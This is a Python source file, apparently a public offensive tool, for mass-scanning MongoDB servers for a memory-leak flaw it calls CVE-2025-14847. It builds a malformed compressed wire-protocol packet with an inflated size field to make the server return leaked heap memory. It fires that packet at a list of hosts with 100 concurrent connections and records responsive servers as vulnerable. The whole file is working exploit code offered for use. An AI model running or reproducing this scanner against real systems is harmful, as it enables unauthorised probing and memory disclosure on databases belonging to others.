#!/usr/bin/env python3

import asyncio
import struct
import zlib
import random
import argparse
import os
import sys
from datetime import datetime

BANNER = r"""
  __  __                               ____  _                 _ 
 |  \/  | ___  _ __   __ _  ___ | __ )| | ___  ___  __| |
 | |\/| |/ _ \| '_ \ / _` |/ _ \|  _ \| |/ _ \/ _ \/ _` |
 | |  | | (_) | | | | (_| | (_) | |_) | |  __/  __/ (_| |
 |_|  |_|\___/|_| |_|\__, |\___/|____/|_|\___|\___|\__,_|
                     |___/          v1.1 - Created by Black1hp
"""

DEFAULT_PORT = 27017
LEAK_SIZE = 65536

def print_banner():
    print("\033[94m" + BANNER + "\033[0m")
    print(f"[*] Author: Black1hp | GitHub: github.com/black1hp")
    print(f"[*] X: x.com/black1hp | Medium: medium.com/@black1hp")
    print("-" * 65)

def build_malformed_packet(leak_size):
    bson_payload = b'\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'
    op_query_header = struct.pack('<I', 0) + b'admin.$cmd\x00' + struct.pack('<ii', 0, -1)
    original_msg = op_query_header + bson_payload
    compressed_body = zlib.compress(original_msg)

    op_compressed_data = (
        struct.pack('<I', 2004) +
        struct.pack('<I', leak_size) +
        b'\x02' +
        compressed_body
    )

    request_id = random.randint(1000, 9999)
    total_len = 16 + len(op_compressed_data)
    header = struct.pack('<iiii', total_len, request_id, 0, 2012)

    return header + op_compressed_data

async def write_result(target, data_len):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("vulnerable_targets.txt", "a") as f:
        f.write(f"[{timestamp}] {target} - Reported Leak Size: {data_len} bytes\n")

async def scan_target(target, semaphore, timeout):
    async with semaphore:
        target = target.strip()
        if not target: return

        try:
            host = target
            port = DEFAULT_PORT
            if ":" in target:
                host, port = target.split(":")
                port = int(port)

            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout
            )

            packet = build_malformed_packet(LEAK_SIZE)
            writer.write(packet)
            await writer.drain()

            header = await asyncio.wait_for(reader.readexactly(16), timeout=timeout)
            resp_len, _, _, _ = struct.unpack('<iiii', header)

            if resp_len > 500:
                print(f"\033[92m[+] VULNERABLE: {host}:{port} | Reported Response: {resp_len} bytes\033[0m")
                await write_result(f"{host}:{port}", resp_len)
            else:
                print(f"\033[90m[-] {host}:{port} - Not Vulnerable\033[0m")

            writer.close()
            await writer.wait_closed()

        except Exception:
            pass

async def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description="High-Performance MongoDB CVE-2025-14847 Scanner",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-i", "--input", required=True, help="File containing targets")
    parser.add_argument("-c", "--concurrency", type=int, default=100, help="Concurrency level")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Timeout in seconds")

    args = parser.parse_args()

    if not os.path.exists(args.input):
        print(f"[!] Error: File '{args.input}' not found.")
        return

    with open(args.input, "r") as f:
        targets = f.readlines()

    print(f"[*] Loaded {len(targets)} targets.")
    print(f"[*] Concurrency: {args.concurrency} | Timeout: {args.timeout}s")
    print("-" * 65)

    semaphore = asyncio.Semaphore(args.concurrency)
    tasks = [scan_target(t, semaphore, args.timeout) for t in targets]

    await asyncio.gather(*tasks)
    print("-" * 65)
    print("[*] Scan complete. Results saved to 'vulnerable_targets.txt'.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)
